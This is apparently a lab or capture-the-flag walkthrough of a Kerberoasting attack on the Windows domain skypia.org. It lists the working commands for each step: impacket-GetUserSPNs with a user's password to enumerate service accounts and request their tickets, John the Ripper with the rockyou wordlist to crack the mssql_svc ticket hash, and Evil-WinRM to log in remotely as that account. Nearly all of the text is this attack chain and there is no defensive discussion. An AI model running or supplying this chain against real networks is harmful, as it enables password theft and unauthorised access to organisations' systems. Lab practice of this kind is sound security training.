# Impacket and Evil-WinRM Usage for Enumeration and Access

## 1) Run `impacket-GetUserSPNs`
To get service names, run the following command with the user and the domain:
```bash
impacket-GetUserSPNs -dc-ip 192.168.56.107 skypia.org/penni.andrea:computer
```

## 2) Get Tickets for the Services
Next, request tickets for the services using:
```bash
impacket-GetUserSPNs -dc-ip 192.168.56.107 -request skypia.org/penni.andrea:computer
```

## 3) Crack the Password from the Hash
Use John the Ripper to crack the password from the hash:

```bash
john --format=krb5tgs mssql_svc --wordlist=/usr/share/wordlists/rockyou.txt
```

Alternatively, install and use a different wordlist (e.g., seclists):

```bash
apt -y install seclists
```

## 4) Get Remote Access with Evil-WinRM
Use Evil-WinRM to get remote access with the `mssql_svc` user:

```bash
evil-winrm -i 192.168.56.107 -u mssql_svc
```
